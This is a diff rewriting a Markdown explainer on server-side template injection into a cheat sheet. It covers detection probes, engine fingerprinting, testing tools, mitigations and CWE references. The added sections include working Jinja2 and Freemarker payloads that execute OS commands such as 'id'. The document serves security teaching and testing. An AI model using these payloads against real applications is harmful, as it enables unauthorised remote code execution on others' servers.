@@ -1,31 +1,68 @@
 # What is Server-Side Template Injection?
-Server-Side Template Injection (SSTI) is a type of security vulnerability that occurs when an attacker can manipulate or inject malicious code into server-side templates. These templates are used by web applications to dynamically generate HTML content, emails, or other responses sent to users.
 
-## How Does Server-Side Template Injection Work?
-- Template Engines: Many web frameworks and content management systems (CMS) use template engines to generate dynamic content. These engines process templates, which often include placeholders or tags, to produce the final output sent to users.
+Server-Side Template Injection (SSTI) happens when user input is embedded into a template that the server then evaluates. Because template engines can call into the host language, SSTI often escalates straight to remote code execution. The classic tell is that `{{7*7}}` comes back as `49`.
 
-- User Input: If the application incorporates user-supplied data directly into templates without proper validation or sanitization, it can be vulnerable to SSTI. Attackers exploit this by injecting template-specific syntax or code into input fields or parameters.
+## How it works
 
-- Code Execution: When the server processes the manipulated template, it interprets the injected code as part of the template logic, executing it within the server's context. This can lead to various security risks, such as data leakage, remote code execution, or server compromise.
+- The app builds a template by concatenating user input instead of passing it as data
+- The engine evaluates your input as template syntax, not text
+- Depending on the engine you can read variables, call objects, or reach the OS
 
-## Example Scenario
-Imagine a web application that uses a template engine to generate HTML pages dynamically. The application allows users to submit feedback forms, and their input is displayed on a webpage using a template. If the application fails to sanitize user input properly, an attacker could inject template-specific code into the feedback form. For example, by injecting {{7*7}} into the form, the attacker could trigger server-side evaluation, resulting in 49 being displayed on the webpage.
+## Detection payloads
 
-## Impact of Server-Side Template Injection
-- Remote Code Execution: Attackers can execute arbitrary code within the server's context, potentially gaining full control over the server, accessing sensitive data, or launching further attacks.
+```text
+# Polyglot probe - if any part evaluates, dig deeper
+${7*7}
+{{7*7}}
+<%= 7*7 %>
+#{7*7}
+{{7*'7'}}
 
-- Data Leakage: SSTI vulnerabilities may expose sensitive information stored on the server, such as configuration files, database credentials, or internal system details.
+# Engine fingerprinting
+{{7*7}}      -> Jinja2 / Twig
+${7*7}       -> Freemarker / JSP EL
+#{7*7}       -> Ruby ERB / Thymeleaf
+```
 
-- Application Compromise: Server-Side Template Injection can lead to application compromise, service disruption, or unauthorized access to user data, compromising the integrity and security of the entire system.
+## Exploitation examples
 
-## Mitigating Server-Side Template Injection
-- Input Validation and Sanitization: Validate and sanitize user input to prevent injection of template-specific syntax or code into templates.
+```python
+# Jinja2 (Python) - read files then RCE
+{{ config.items() }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+```
 
-- Contextual Output Encoding: Encode output to ensure that user-supplied data is treated as data, not executable code, when rendered within templates.
+```java
+// Freemarker (Java) - command execution
+<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
+```
 
-- Template Engine Security Features: Utilize security features provided by template engines, such as sandboxing, context-specific escaping, or restricted evaluation, to mitigate the impact of SSTI vulnerabilities.
+## Tools
 
-- Static Analysis and Security Testing: Conduct regular security assessments, code reviews, and penetration testing to identify and remediate SSTI vulnerabilities in web applications.
+- [tplmap](https://github.com/epinna/tplmap) - automated SSTI detection and exploitation
+- [Burp Suite](https://portswigger.net/burp) - Repeater for manual engine fingerprinting
 
-## Conclusion
-Server-Side Template Injection is a critical security vulnerability that can lead to remote code execution, data leakage, and application compromise. By understanding how SSTI works and implementing appropriate security measures such as input validation, output encoding, and template engine security features, developers can mitigate the risk of exploitation and protect web applications from malicious attacks. Regular security assessments and updates are essential for maintaining a secure software environment.
+## Manual testing
+
+1. Inject `${{<%[%'"}}%\` and see if the app errors (unbalanced syntax)
+2. Send math like `{{7*7}}` and confirm it evaluates to `49`
+3. Fingerprint the engine using the syntax that works
+4. Move from reading objects to invoking OS calls, in scope only
+
+## Mitigation
+
+- Do not let users control template content; pass their data as parameters
+- Use a logic-less or sandboxed template engine for untrusted input
+- Keep the template engine patched and disable dangerous built-ins
+- Run the app with least privilege so RCE impact is contained
+
+## Deep dive
+
+- [SSTI - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
+- [PortSwigger SSTI labs](https://portswigger.net/web-security/server-side-template-injection)
+
+## CWE
+
+- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
+- CWE-94: Improper Control of Generation of Code
